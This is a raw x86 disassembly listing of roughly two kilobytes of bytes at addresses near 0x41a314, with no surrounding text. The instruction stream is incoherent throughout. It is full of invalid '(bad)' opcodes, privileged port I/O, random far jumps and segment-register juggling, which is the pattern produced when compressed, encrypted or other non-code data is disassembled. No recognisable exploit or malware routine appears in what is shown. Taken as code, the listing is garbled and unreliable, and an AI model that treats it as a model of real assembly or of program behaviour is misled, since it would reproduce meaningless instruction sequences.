  41a314:	sbb    bh,BYTE PTR [edx-0x2b]
  41a317:	loop   0x41a2f3
  41a319:	xchg   edi,eax
  41a31a:	xlat   BYTE PTR ds:[ebx]
  41a31b:	cwde   
  41a31c:	pop    edx
  41a31d:	imul   edx,DWORD PTR [edx-0x5b3ccbc2],0x4a111be7
  41a327:	jne    0x41a360
  41a329:	adc    dh,al
  41a32b:	add    dl,bl
  41a32d:	ficomp WORD PTR [edx-0x39]
  41a330:	adc    ecx,DWORD PTR [ecx+esi*8-0x4]
  41a334:	push   eax
  41a335:	popf   
  41a336:	out    0x3a,eax
  41a338:	ss pop ss
  41a33a:	aam    0xbb
  41a33c:	cs jmp 0x41a34e
  41a33f:	dec    esp
  41a340:	nop
  41a341:	scas   eax,DWORD PTR es:[edi]
  41a342:	mov    esi,0xfc749947
  41a347:	jns    0x41a3bb
  41a349:	or     bl,BYTE PTR [edx-0x73]
  41a34c:	int    0xeb
  41a34e:	fsub   DWORD PTR [eax+0xbd136da]
  41a354:	packsswb mm0,mm6
  41a357:	and    BYTE PTR [edi+0x1eee9467],ch
  41a35d:	push   edx
  41a35e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a35f:	jo     0x41a2f4
  41a361:	dec    BYTE PTR [edi]
  41a363:	sbb    dh,BYTE PTR [edx+edx*2-0x6775bdba]
  41a36a:	mov    dh,0xb2
  41a36c:	test   BYTE PTR [esi+0x76],0xe8
  41a370:	outs   dx,BYTE PTR ds:[esi]
  41a371:	fistp  DWORD PTR [ecx-0xf]
  41a374:	mov    DWORD PTR [ebp+edx*8-0x19],ecx
  41a378:	int    0x58
  41a37a:	(bad)  
  41a37b:	push   esi
  41a37c:	test   DWORD PTR [eax-0x32],ebp
  41a37f:	mov    ebp,0xf44e3dbb
  41a384:	pop    esi
  41a385:	mov    ah,0xe6
  41a387:	inc    esi
  41a388:	sbb    eax,0xad2b8203
  41a38d:	sub    BYTE PTR [ecx],dh
  41a38f:	cmp    dh,cl
  41a391:	adc    esp,edi
  41a393:	(bad)  
  41a394:	and    BYTE PTR [esi+0x406809eb],dh
  41a39a:	adc    DWORD PTR [esi+esi*2-0x5c],ecx
  41a39e:	sbb    ch,BYTE PTR [ebx+0x36194a18]
  41a3a4:	xchg   BYTE PTR [esi],dh
  41a3a6:	bswap  ecx
  41a3a8:	add    DWORD PTR ds:[eax+eax*4+0x64511720],esi
  41a3b0:	inc    edi
  41a3b1:	pop    esi
  41a3b2:	mov    WORD PTR [ebp-0x446b3cf6],ss
  41a3b8:	int    0xea
  41a3ba:	bound  eax,QWORD PTR [edi+0x5f]
  41a3bd:	je     0x41a38e
  41a3bf:	imul   DWORD PTR [eax-0x44]
  41a3c2:	in     al,dx
  41a3c3:	and    eax,0x6189b74
  41a3c8:	jmp    0xe663:0x5f1d634
  41a3cf:	mov    cl,0xe5
  41a3d1:	jp     0x41a375
  41a3d3:	leave  
  41a3d4:	jmp    0x8e0c7c8f
  41a3d9:	dec    ebp
  41a3da:	pushf  
  41a3db:	sahf   
  41a3dc:	push   esi
  41a3dd:	adc    BYTE PTR [edi+0x60],0x57
  41a3e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3e2:	ret    0x8efe
  41a3e5:	jl     0x41a3fb
  41a3e7:	clc    
  41a3e8:	enter  0x444e,0x12
  41a3ec:	out    0x3a,eax
  41a3ee:	dec    ecx
  41a3ef:	dec    ebx
  41a3f0:	pop    eax
  41a3f1:	push   0x42
  41a3f3:	xchg   DWORD PTR [ebx+0x52],esi
  41a3f6:	or     DWORD PTR [edi],esp
  41a3f8:	repnz in al,0x9f
  41a3fb:	in     eax,dx
  41a3fc:	sbb    eax,esi
  41a3fe:	cs xor eax,0xcc1de9e4
  41a404:	les    esp,FWORD PTR [edi]
  41a406:	xchg   ebp,eax
  41a407:	jmp    0x93ea08a2
  41a40c:	div    BYTE PTR [ebp-0x44]
  41a40f:	test   ch,ch
  41a411:	lods   eax,DWORD PTR ds:[esi]
  41a412:	fwait
  41a413:	sbb    eax,DWORD PTR [esi]
  41a415:	test   bl,bl
  41a417:	xchg   esp,eax
  41a418:	add    DWORD PTR [edx+esi*2-0x64],esi
  41a41c:	dec    ebx
  41a41d:	out    dx,eax
  41a41e:	mov    al,ds:0x4bfb2576
  41a423:	push   es
  41a424:	push   esi
  41a425:	mov    edi,0x4943c0fa
  41a42a:	push   0xd65b9185
  41a42f:	cmp    dl,BYTE PTR [edi]
  41a431:	shl    BYTE PTR [ecx],1
  41a433:	pop    eax
  41a434:	in     al,0x78
  41a436:	cmp    bl,BYTE PTR [esi+ecx*2-0x48]
  41a43a:	inc    ecx
  41a43b:	sbb    BYTE PTR [ebp+0x37ca7852],dh
  41a441:	int    0xaf
  41a443:	and    DWORD PTR [ebx+0x26ed0daf],ebp
  41a449:	push   0xffffffbd
  41a44b:	jge    0x41a46d
  41a44d:	and    ch,cl
  41a44f:	int3   
  41a450:	icebp  
  41a451:	fcomp  st(5)
  41a453:	cmp    DWORD PTR [edx+0x72a7c329],edi
  41a459:	imul   eax,DWORD PTR [ecx+ebx*8],0x3aa3d098
  41a460:	dec    edi
  41a461:	push   0xffffffb9
  41a463:	cmp    cl,BYTE PTR [ebx]
  41a465:	test   eax,0x7dc00f2
  41a46a:	loopne 0x41a48e
  41a46c:	pop    ebx
  41a46d:	std    
  41a46e:	pop    esp
  41a46f:	nop
  41a470:	mov    ah,0x35
  41a472:	push   edx
  41a473:	pop    edx
  41a474:	lods   al,BYTE PTR ds:[esi]
  41a475:	mov    dh,0x25
  41a477:	pusha  
  41a478:	sbb    ebx,ecx
  41a47a:	bound  esp,QWORD PTR [edi-0x17962537]
  41a480:	xchg   ebx,eax
  41a481:	shr    DWORD PTR [edx+0x43],1
  41a484:	push   cs
  41a485:	jmp    0xa04ab7bd
  41a48a:	fadd   DWORD PTR [eax-0x4]
  41a48d:	inc    BYTE PTR [edi]
  41a48f:	mov    ebx,0xba89134b
  41a494:	mov    ds:0xba5c23c8,eax
  41a499:	mov    edx,0xfd98d814
  41a49e:	pop    ebp
  41a49f:	outs   dx,BYTE PTR ds:[esi]
  41a4a0:	popa   
  41a4a1:	push   esp
  41a4a2:	adc    eax,0x9721679a
  41a4a7:	push   edi
  41a4a8:	daa    
  41a4a9:	pop    ebx
  41a4aa:	and    esp,ebp
  41a4ac:	mov    eax,0x4564b23c
  41a4b1:	fwait
  41a4b2:	pushf  
  41a4b3:	sub    esi,edx
  41a4b5:	xchg   edx,eax
  41a4b6:	xchg   BYTE PTR [ecx-0x79ff7bf0],dh
  41a4bc:	cmp    BYTE PTR [edi],cl
  41a4be:	ins    DWORD PTR es:[edi],dx
  41a4bf:	sbb    dh,bl
  41a4c1:	mov    ah,0xd4
  41a4c3:	pusha  
  41a4c4:	idiv   BYTE PTR [edi+0x364fd401]
  41a4ca:	shl    BYTE PTR [esp+ecx*2],cl
  41a4cd:	das    
  41a4ce:	pop    edx
  41a4cf:	sbb    BYTE PTR [eax-0x24],bl
  41a4d2:	cs pop es
  41a4d4:	ret    0x3dc4
  41a4d7:	cmp    eax,0x5547a397
  41a4dc:	(bad)
  41a4df:	jge    0x41a4bb
  41a4e1:	inc    ecx
  41a4e2:	xchg   DWORD PTR [eax],edx
  41a4e4:	call   0xcd7c:0x3eb61841
  41a4eb:	or     bl,BYTE PTR [eax-0x53]
  41a4ee:	jns    0x41a4a9
  41a4f0:	sar    DWORD PTR ds:0x5a2b38e1,0x35
  41a4f7:	cdq    
  41a4f8:	in     al,0x8c
  41a4fa:	jne    0x6b882fb7
  41a500:	and    al,0x32
  41a502:	adc    eax,0x7bf7f614
  41a507:	sti    
  41a508:	addr16 je 0x41a4d2
  41a50b:	mov    dh,al
  41a50d:	js     0x41a581
  41a50f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a510:	outs   dx,DWORD PTR ds:[esi]
  41a511:	or     dl,BYTE PTR ds:0xc9aa19d9
  41a517:	or     al,BYTE PTR [ebp+0x1d]
  41a51a:	gs cli 
  41a51c:	retf   0x5431
  41a51f:	int3   
  41a520:	dec    ebx
  41a521:	add    eax,0xafc568dd
  41a526:	and    eax,DWORD PTR [ebp-0x7a]
  41a529:	sbb    BYTE PTR [edi+0x55],bl
  41a52c:	retf   
  41a52d:	mov    bh,0xb4
  41a52f:	cmp    DWORD PTR [ebx+edi*8],0xffffffa1
  41a533:	test   al,0x21
  41a535:	test   al,0x96
  41a537:	xchg   ebx,eax
  41a538:	(bad)  
  41a539:	ds stos DWORD PTR es:[edi],eax
  41a53b:	addr16 dec edx
  41a53d:	cmp    BYTE PTR [edi-0x51],al
  41a540:	inc    edi
  41a541:	jmp    0x5827f573
  41a546:	pusha  
  41a547:	cmc    
  41a548:	sub    DWORD PTR [eax],edx
  41a54a:	mov    ch,0x5e
  41a54c:	int3   
  41a54d:	xchg   ebp,eax
  41a54e:	pop    esi
  41a54f:	sub    dh,BYTE PTR [edx-0x6d716c26]
  41a555:	jns    0x41a51d
  41a557:	call   0xec27:0x4b62079
  41a55e:	adc    al,0xf7
  41a560:	pop    eax
  41a561:	rcr    ebp,0x31
  41a564:	xchg   edx,eax
  41a565:	sbb    eax,0x675dfcb9
  41a56a:	rol    DWORD PTR [eax-0x41de56b7],1
  41a570:	jbe    0x41a5e3
  41a572:	mul    DWORD PTR [ebp*8+0xfdab6a0]
  41a579:	adc    esp,DWORD PTR [edi+0x676253b4]
  41a57f:	and    ah,BYTE PTR [esi+0x66]
  41a582:	in     al,dx
  41a583:	xor    al,0x4c
  41a585:	lods   eax,DWORD PTR ds:[esi]
  41a586:	aas    
  41a587:	pop    ds
  41a588:	ds jle 0x41a5c9
  41a58b:	int3   
  41a58c:	rol    DWORD PTR [edi-0x51],0xbd
  41a590:	jmp    0x4354:0xb0a355fe
  41a597:	xor    al,0x45
  41a599:	sub    ecx,DWORD PTR [ecx+eiz*1-0x6e064a89]
  41a5a0:	push   0x38bb0b83
  41a5a5:	dec    ebx
  41a5a6:	sub    eax,0x26e9a116
  41a5ab:	in     al,0x23
  41a5ad:	shl    BYTE PTR [edi+0x13c90df5],0xd6
  41a5b4:	and    BYTE PTR [edi],ah
  41a5b6:	sbb    DWORD PTR [ebx],edi
  41a5b8:	outs   dx,BYTE PTR ds:[esi]
  41a5b9:	or     DWORD PTR [eax+0x70],0xc6c4c8f1
  41a5c0:	inc    edi
  41a5c1:	mov    ds,WORD PTR [esi]
  41a5c3:	fsubr  QWORD PTR ss:[ebx-0x3b]
  41a5c7:	inc    edx
  41a5c8:	call   0xcd7b924a
  41a5cd:	test   eax,0x586cdaa0
  41a5d2:	push   edx
  41a5d3:	icebp  
  41a5d4:	sbb    DWORD PTR [esi-0x43fe2fd3],ecx
  41a5da:	add    eax,0xc29ccb7c
  41a5df:	inc    esi
  41a5e0:	in     eax,dx
  41a5e1:	jbe    0x41a601
  41a5e3:	adc    al,0x55
  41a5e5:	(bad)  
  41a5e6:	stc    
  41a5e7:	les    eax,FWORD PTR [eax+edi*8]
  41a5ea:	xchg   ecx,eax
  41a5eb:	std    
  41a5ec:	cmp    dl,BYTE PTR fs:[esi]
  41a5ef:	rol    DWORD PTR [ebp-0x2c],0x75
  41a5f3:	fwait
  41a5f4:	stos   DWORD PTR es:[edi],eax
  41a5f5:	out    0x37,eax
  41a5f7:	(bad)  
  41a5f8:	pop    edx
  41a5f9:	sub    eax,0x6a6ff0a7
  41a5fe:	aam    0x0
  41a600:	dec    esp
  41a601:	cld    
  41a602:	pop    ds
  41a603:	mov    ch,0x58
  41a605:	sub    esi,edi
  41a607:	inc    edx
  41a608:	mov    esi,0xe1699622
  41a60d:	mov    ah,ch
  41a60f:	jno    0x41a669
  41a611:	mov    ebx,eax
  41a613:	jmp    0x41a5ea
  41a615:	mov    WORD PTR [ebx+eiz*2],cs
  41a618:	ins    BYTE PTR es:[edi],dx
  41a619:	sbb    bl,BYTE PTR [edx-0x63c4164e]
  41a61f:	or     dh,BYTE PTR [ecx-0x28ada302]
  41a625:	pop    esi
  41a626:	popf   
  41a627:	mov    bh,0xb8
  41a629:	je     0x41a675
  41a62b:	and    eax,0x50bcc4d5
  41a630:	xchg   ebp,eax
  41a631:	inc    edi
  41a632:	pop    ecx
  41a633:	jmp    0x93a:0xe0a56c44
  41a63a:	inc    esp
  41a63b:	cwde   
  41a63c:	nop
  41a63d:	loope  0x41a617
  41a63f:	mov    edi,0x584596b1
  41a644:	push   esi
  41a645:	daa    
  41a646:	jb     0x41a5e2
  41a648:	cli    
  41a649:	mov    ebx,0x5c10736e
  41a64e:	in     al,0x59
  41a650:	(bad)  
  41a651:	in     al,0x9f
  41a653:	loope  0x41a5fc
  41a655:	lock inc eax
  41a657:	adc    DWORD PTR [edx+0x14720928],edi
  41a65d:	or     BYTE PTR [ecx-0x66],dl
  41a660:	push   edx
  41a661:	push   esi
  41a662:	imul   edx,DWORD PTR [ecx],0x4b
  41a665:	repz inc edx
  41a667:	mov    ebp,0x3dcb3437
  41a66c:	fstp   TBYTE PTR [edx]
  41a66e:	sub    cl,cl
  41a670:	mov    al,ds:0x2e704051
  41a675:	mov    WORD PTR [edx-0x9],gs
  41a678:	lods   al,BYTE PTR ds:[esi]
  41a679:	jo     0x41a66f
  41a67b:	cmp    edi,DWORD PTR [edi+0x102afa3b]
  41a681:	aaa    
  41a682:	jl     0x41a69f
  41a684:	mov    esi,esi
  41a686:	cld    
  41a687:	pusha  
  41a688:	push   ebp
  41a689:	popf   
  41a68a:	push   ss
  41a68b:	dec    ecx
  41a68c:	jg     0x41a6f3
  41a68e:	outs   dx,BYTE PTR ds:[esi]
  41a68f:	adc    ebx,DWORD PTR [edx]
  41a691:	pop    ss
  41a692:	xchg   bh,ah
  41a694:	in     al,0xe2
  41a696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a697:	xchg   edi,eax
  41a698:	(bad)  
  41a699:	aam    0xff
  41a69b:	fcom   DWORD PTR [esp+eiz*2]
  41a69e:	call   0xf354:0xe6687a30
  41a6a5:	int    0x9d
  41a6a7:	jne    0x41a697
  41a6a9:	lods   eax,DWORD PTR ds:[esi]
  41a6aa:	imul   ecx,DWORD PTR [edx-0xb467b2d],0x14
  41a6b1:	mul    DWORD PTR [esi]
  41a6b3:	inc    edi
  41a6b4:	fiadd  WORD PTR [edi+0x4]
  41a6b7:	test   al,0x6d
  41a6b9:	lods   eax,DWORD PTR ds:[esi]
  41a6ba:	add    DWORD PTR [ebx+0x78],esi
  41a6bd:	mov    ebp,0x973604e0
  41a6c2:	push   ebx
  41a6c3:	fdiv   DWORD PTR ss:[edx+0x390e9b83]
  41a6ca:	icebp  
  41a6cb:	in     eax,0xa9
  41a6cd:	es mov esp,0xf78fb52b
  41a6d3:	cmc    
  41a6d4:	les    eax,FWORD PTR [eax]
  41a6d6:	std    
  41a6d7:	cmp    BYTE PTR [eax-0x35],dh
  41a6da:	fist   DWORD PTR [esi+ecx*2]
  41a6dd:	inc    edx
  41a6de:	mov    esi,0x5c14ef5d
  41a6e3:	mov    ds:0x32fc3a9,eax
  41a6e8:	adc    ebx,DWORD PTR [ecx]
  41a6ea:	jle    0x41a6ba
  41a6ec:	cmp    al,0x31
  41a6ee:	jnp    0x41a6b3
  41a6f0:	mov    ebp,DWORD PTR ds:0x7a5493fc
  41a6f6:	mov    ?,WORD PTR [esi+0x3f]
  41a6f9:	pop    esp
  41a6fa:	lock add ecx,DWORD PTR [ecx-0x67]
  41a6fe:	jnp    0x41a6c3
  41a700:	mov    DWORD PTR [esp+ebx*8-0x2b],ebp
  41a704:	aaa    
  41a705:	shr    DWORD PTR ds:0xa4d76196,0xc5
  41a70c:	imul   ecx,esi,0xffffffe5
  41a70f:	dec    ebp
  41a710:	jp     0x41a6a3
  41a712:	ja     0x41a6c1
  41a714:	sti    
  41a715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a716:	pusha  
  41a717:	into   
  41a718:	inc    eax
  41a719:	call   0xa12e2506
  41a71e:	scas   eax,DWORD PTR es:[edi]
  41a71f:	and    DWORD PTR [ecx+0x4b],edx
  41a722:	nop
  41a723:	jl     0x41a76f
  41a725:	ja     0x41a753
  41a727:	cmc    
  41a728:	sub    dh,ah
  41a72a:	aad    0x30
  41a72c:	aaa    
  41a72d:	add    ebx,DWORD PTR [esi]
  41a72f:	lahf   
  41a730:	and    esp,DWORD PTR [edx]
  41a732:	sar    DWORD PTR [ebp-0x1435604],0x5d
  41a739:	adc    esi,0xefd8aafb
  41a73f:	sub    al,0x3d
  41a741:	mov    bl,0x5d
  41a743:	push   ss
  41a744:	sub    dh,BYTE PTR [edx+0x58]
  41a747:	aam    0x26
  41a749:	jp     0x41a78c
  41a74b:	stos   BYTE PTR es:[edi],al
  41a74c:	mov    ecx,es
  41a74e:	pop    ebx
  41a74f:	adc    DWORD PTR [ebp+0xa157449],ebp
  41a755:	outs   dx,DWORD PTR ds:[esi]
  41a756:	sbb    eax,0x33a36a2d
  41a75b:	loope  0x41a7d3
  41a75d:	outs   dx,DWORD PTR ds:[esi]
  41a75e:	push   ds
  41a75f:	xor    eax,0xeaca3207
  41a764:	pop    esp
  41a765:	and    DWORD PTR [edx],eax
  41a767:	loope  0x41a775
  41a769:	mov    ch,0xe0
  41a76b:	inc    edi
  41a76c:	cmp    bh,BYTE PTR [eax-0x2]
  41a76f:	mov    esi,DWORD PTR ds:[eax-0x69]
  41a773:	sbb    esi,ecx
  41a775:	gs aad 0xc7
  41a778:	cmp    BYTE PTR [ecx+edx*8],bh
  41a77b:	xchg   eax,edx
  41a77d:	into   
  41a77e:	(bad)  
  41a77f:	pusha  
  41a780:	dec    edi
  41a781:	lods   al,BYTE PTR ds:[esi]
  41a782:	ins    DWORD PTR es:[edi],dx
  41a783:	xlat   BYTE PTR ds:[ebx]
  41a784:	aad    0x2
  41a786:	fdivr  QWORD PTR [ecx-0x5f]
  41a789:	jne    0x41a7b0
  41a78b:	mov    ch,0xd6
  41a78d:	jnp    0x41a7bc
  41a78f:	push   ebx
  41a790:	sub    BYTE PTR [edx-0xad5a7f6],0x56
  41a797:	add    al,0xf5
  41a799:	and    dh,BYTE PTR [edi+0x76]
  41a79c:	es das 
  41a79e:	js     0x41a76a
  41a7a0:	rol    bl,1
  41a7a2:	jns    0x41a80e
  41a7a4:	jl     0x41a7fd
  41a7a6:	sub    BYTE PTR [ebx],0x79
  41a7a9:	into   
  41a7aa:	(bad)  
  41a7ab:	cld    
  41a7ac:	pop    ebp
  41a7ad:	push   ds
  41a7ae:	push   cs
  41a7af:	aas    
  41a7b0:	pop    ds
  41a7b1:	cs mov esi,0x1552d25e
  41a7b7:	sahf   
  41a7b8:	add    ebx,DWORD PTR [eax]
  41a7ba:	dec    esp
  41a7bb:	inc    ecx
  41a7bc:	retf   0x33da
  41a7bf:	adc    edx,ecx
  41a7c1:	mov    eax,0x47675bc0
  41a7c6:	and    edx,DWORD PTR [ecx]
  41a7c8:	mov    ds:0x49922095,al
  41a7cd:	jo     0x41a7c8
  41a7cf:	rcr    BYTE PTR cs:[esi+0x37],0xaa
  41a7d4:	in     eax,dx
  41a7d5:	ficom  DWORD PTR ds:0x646e6fd1
  41a7db:	mov    ebp,0xb905e8a0
  41a7e0:	lods   eax,DWORD PTR ds:[esi]
  41a7e1:	jge    0x41a810
  41a7e3:	xchg   esi,eax
  41a7e4:	mov    ah,0xd
  41a7e6:	hlt    
  41a7e7:	addr16 mov edx,0x4152c744
  41a7ed:	xchg   ebp,eax
  41a7ee:	xchg   esp,eax
  41a7ef:	stos   BYTE PTR es:[edi],al
  41a7f0:	push   cs
  41a7f1:	enter  0xc322,0x8e
  41a7f5:	fmul   QWORD PTR [ebx]
  41a7f7:	pop    ds
  41a7f8:	lods   eax,DWORD PTR ds:[esi]
  41a7f9:	xor    dl,BYTE PTR [edx+0x4a]
  41a7fc:	xor    al,BYTE PTR [ebx-0x6c]
  41a7ff:	add    esi,DWORD PTR [eax+0x6827bd42]
  41a805:	shl    edi,cl
  41a807:	cmp    edx,DWORD PTR [eax-0x2002094e]
  41a80d:	push   0x2d98597f
  41a812:	adc    DWORD PTR [esi+ebp*1],esp
  41a815:	pushf  
  41a816:	clc    
  41a817:	xchg   ecx,eax
  41a818:	(bad)  
  41a819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a81a:	add    DWORD PTR [edi+0x40],edi
  41a81d:	push   ss
  41a81e:	icebp  
  41a81f:	mov    DWORD PTR [ebx-0xa843d14],0xa751d12e
  41a829:	jbe    0x41a81c
  41a82b:	push   ds
  41a82c:	arpl   WORD PTR [edx],sp
  41a82e:	out    dx,al
  41a82f:	imul   esi,ebp,0x38c3c890
  41a835:	retf   0x4be
  41a838:	dec    ebx
  41a839:	mov    edi,0xeccf9a17
  41a83e:	add    ah,ah
  41a840:	(bad)  
  41a841:	ins    BYTE PTR es:[edi],dx
  41a842:	sahf   
  41a843:	xchg   ebx,eax
  41a844:	or     BYTE PTR [edi],0xda
  41a847:	dec    esp
  41a848:	popa   
  41a849:	leave  
  41a84a:	pusha  
  41a84b:	add    al,bl
  41a84d:	and    DWORD PTR [ecx],ebp
  41a84f:	into   
  41a850:	popa   
  41a851:	push   esi
  41a852:	mov    ecx,cs
  41a854:	xor    esp,ebx
  41a856:	mov    ebx,0x32abb3b6
  41a85b:	push   ebx
  41a85c:	stos   BYTE PTR es:[edi],al
  41a85d:	add    ebp,esi
  41a85f:	jmp    0xb6bd4fc9
  41a864:	jl     0x41a8d0
  41a866:	sub    BYTE PTR [ecx-0x738a5d0],cl
  41a86c:	cmp    edx,0x28
  41a86f:	int    0x8c
  41a871:	nop
  41a872:	xchg   BYTE PTR [edi],cl
  41a874:	pushf  
  41a875:	popa   
  41a876:	push   es
  41a877:	cdq    
  41a878:	xchg   BYTE PTR [edx+0x7e3e373a],al
  41a87e:	mov    ds:0x43062fd0,al
  41a883:	adc    BYTE PTR [edi-0x76],bl
  41a886:	imul   edx,DWORD PTR [esi+0x38],0xe5fb106a
  41a88d:	sbb    DWORD PTR [ecx+edx*8-0x78],eax
  41a891:	adc    esp,DWORD PTR [ecx+eiz*8+0xb]
  41a895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a896:	jp     0x41a89e
  41a898:	sub    BYTE PTR [edi+0x7a],al
  41a89b:	mov    ecx,0x28532b8d
  41a8a0:	mov    ds:0x9fef7a,al
  41a8a5:	mov    eax,ds:0x7b0fcb80
  41a8aa:	loop   0x41a88d
  41a8ac:	fdivr  QWORD PTR [ecx-0x7]
  41a8af:	fnstcw WORD PTR [ebx+0x7b]
  41a8b2:	lahf   
  41a8b3:	and    BYTE PTR [eax-0x74],ch
  41a8b6:	icebp  
  41a8b7:	arpl   WORD PTR [esi+0x71b27a3e],di
  41a8bd:	cli    
  41a8be:	lods   eax,DWORD PTR ds:[esi]
  41a8bf:	xchg   BYTE PTR [edx+0x12134095],cl
  41a8c5:	mov    dh,BYTE PTR [edx-0xc]
  41a8c8:	mov    WORD PTR [esi*8+0x289eeb91],ss
  41a8cf:	sar    BYTE PTR ds:0x73d48e6c,0xc8
  41a8d6:	jp     0x41a8bf
  41a8d8:	inc    esp
  41a8d9:	xchg   ebx,eax
  41a8da:	mov    edx,0xd29dc37d
  41a8df:	lods   eax,DWORD PTR ds:[esi]
  41a8e0:	enter  0xd8b4,0xcc
  41a8e4:	push   ds
  41a8e5:	and    eax,0x9ea61109
  41a8ea:	jp     0x41a885
  41a8ec:	mov    ch,0xc3
  41a8ee:	jb     0x41a95b
  41a8f0:	sbb    ah,dl
  41a8f2:	jmp    0x188d802c
  41a8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8f8:	cmp    edi,DWORD PTR [edi+0xb]
  41a8fb:	add    al,BYTE PTR [ebp-0x460c99c4]
  41a901:	xor    DWORD PTR [ecx+eiz*8],ecx
  41a904:	call   0xb647:0x8c5c1c1a
  41a90b:	push   ds
  41a90c:	cmp    ch,BYTE PTR [ebx-0x16244c5c]
  41a912:	sbb    BYTE PTR [edi-0x42fab3a6],0x86
  41a919:	mov    ecx,0x77d169c8
  41a91e:	mov    esi,DWORD PTR [esi+0x5cf0ffe6]
  41a924:	aam    0x18
  41a926:	cld    
  41a927:	mov    bl,0xb3
  41a929:	dec    esi
  41a92a:	stos   DWORD PTR es:[edi],eax
  41a92b:	sub    DWORD PTR [ebp+0x71d485b4],esi
  41a931:	(bad)  
  41a932:	in     al,dx
  41a933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a934:	scas   eax,DWORD PTR es:[edi]
  41a935:	popa   
  41a936:	jns    0x41a939
  41a938:	fimul  WORD PTR [eax+eax*8-0x564daa06]
  41a93f:	xchg   esp,eax
  41a940:	jp     0x41a9b2
  41a942:	mov    esi,0xf1da3dee
  41a947:	xchg   ecx,eax
  41a948:	mov    al,ds:0x40765891
  41a94d:	cmp    ah,BYTE PTR [ecx-0x36]
  41a950:	sar    BYTE PTR [ebx+0x71],0x1f
  41a954:	mov    al,ds:0x38e43128
  41a959:	iret   
  41a95a:	repz mov esi,0x943912af
  41a960:	cmp    BYTE PTR [edx+0x4b],0x40
  41a964:	jecxz  0x41a96d
  41a966:	mov    edi,0x8a0fadc3
  41a96b:	mov    ds:0x6ed14a84,al
  41a970:	loop   0x41a9c9
  41a972:	shl    BYTE PTR ds:0xe780b044,cl
  41a978:	mov    cl,0x82
  41a97a:	jno    0x41a96c
  41a97c:	pop    ebx
  41a97d:	(bad)  
  41a97e:	sub    al,0x7a
  41a980:	jmp    0xed39298b
  41a985:	mov    bh,BYTE PTR [edi]
  41a987:	nop
  41a988:	shr    ch,0xc1
  41a98b:	jb     0x41a9db
  41a98d:	inc    ebp
  41a98e:	shr    DWORD PTR [ebp+0x42],cl
  41a991:	(bad)  
  41a992:	jmp    0x86ba:0x67f55bcf
  41a999:	mov    ah,0x9e
  41a99b:	loope  0x41aa16
  41a99d:	or     esi,DWORD PTR [edx-0x76]
  41a9a0:	mov    eax,0x31fc58a7
  41a9a5:	mov    ds,WORD PTR [esi+0x65]
  41a9a8:	push   cs
  41a9a9:	sbb    DWORD PTR [edx],esi
  41a9ab:	jle    0x41a971
  41a9ad:	gs scas al,BYTE PTR es:[edi]
  41a9af:	cdq    
  41a9b0:	out    dx,al
  41a9b1:	inc    esi
  41a9b2:	icebp  
  41a9b3:	(bad)  
  41a9b4:	scas   eax,DWORD PTR es:[edi]
  41a9b5:	outs   dx,BYTE PTR ds:[esi]
  41a9b6:	sub    eax,0x9712789b
  41a9bb:	pop    ss
  41a9bc:	retf   
  41a9bd:	and    eax,0x4f305fa6
  41a9c2:	xor    eax,0x892d8d9a
  41a9c7:	fs and al,0xa6
  41a9ca:	(bad)
  41a9cd:	aam    0x31
  41a9cf:	or     ch,BYTE PTR ds:0x28aec612
  41a9d5:	cmp    esi,DWORD PTR [esi+0x76]
  41a9d8:	push   ebx
  41a9d9:	push   edi
  41a9da:	ret    0x95ee
  41a9dd:	and    ebp,DWORD PTR [edi]
  41a9df:	and    BYTE PTR ds:0x1786564c,bl
  41a9e5:	ficom  DWORD PTR [eax-0x8]
  41a9e8:	scas   eax,DWORD PTR es:[edi]
  41a9e9:	dec    edi
  41a9ea:	xchg   edi,eax
  41a9eb:	mov    bh,0xb8
  41a9ed:	vaddpd xmm2,xmm0,xmm5
  41a9f1:	adc    BYTE PTR [edi+eax*2-0x2f2d2cf0],0x2c
  41a9f9:	ret    0xd657
  41a9fc:	and    eax,DWORD PTR [eax-0xa]
  41a9ff:	cmp    BYTE PTR [esi+0x4e],ch
  41aa02:	cwde   
  41aa03:	aam    0xb
  41aa05:	ins    DWORD PTR es:[edi],dx
  41aa06:	push   cs
  41aa07:	inc    ebx
  41aa08:	mov    ebp,0xc2c68f5f
  41aa0d:	adc    al,0x60
  41aa0f:	jb     0x41a9f8
  41aa11:	sbb    esp,DWORD PTR [ebp+0x75d0cee6]
  41aa17:	mov    bl,0x93
  41aa19:	jl     0x41aa40
  41aa1b:	mov    WORD PTR [edi+0x6d09544e],fs
  41aa21:	pop    eax
  41aa22:	aaa    
  41aa23:	xor    eax,DWORD PTR [eax-0x3e7871c8]
  41aa29:	and    ecx,DWORD PTR [edi+0x73]
  41aa2c:	gs into 
  41aa2e:	jle    0x41aa4b
  41aa30:	mov    dl,0x60
  41aa32:	jne    0x41aa11
  41aa34:	jne    0x41aa32
  41aa36:	inc    ebp
  41aa37:	inc    edi
  41aa38:	pop    ecx
  41aa39:	repnz push ebp
  41aa3b:	add    eax,0xb715b00c
  41aa40:	aam    0x16
  41aa42:	fnstsw WORD PTR [edx]
  41aa44:	lahf   
  41aa45:	lods   eax,DWORD PTR ds:[esi]
  41aa46:	inc    eax
  41aa47:	ret    0xc98a
  41aa4a:	pop    ss
  41aa4b:	ins    DWORD PTR es:[edi],dx
  41aa4c:	in     eax,0x11
  41aa4e:	dec    esi
  41aa4f:	out    dx,eax
  41aa50:	sub    DWORD PTR [ebx-0x3b],edx
  41aa53:	xchg   esi,eax
  41aa54:	mov    eax,0x7d9f1c45
  41aa59:	loopne 0x41aab0
  41aa5b:	jmp    0x44bbbc49
  41aa60:	pop    ds
  41aa61:	dec    esp
  41aa62:	inc    edx
  41aa63:	jmp    ecx
  41aa65:	test   BYTE PTR [edx+0x7098bd16],0x1c
  41aa6c:	jecxz  0x41aabe
  41aa6e:	sbb    cl,cl
  41aa70:	pop    ebp
  41aa71:	inc    ebx
  41aa72:	mov    esi,0x2b1eac3a
  41aa77:	cmc    
  41aa78:	stos   DWORD PTR es:[edi],eax
  41aa79:	in     eax,dx
  41aa7a:	xchg   esp,eax
  41aa7b:	lahf   
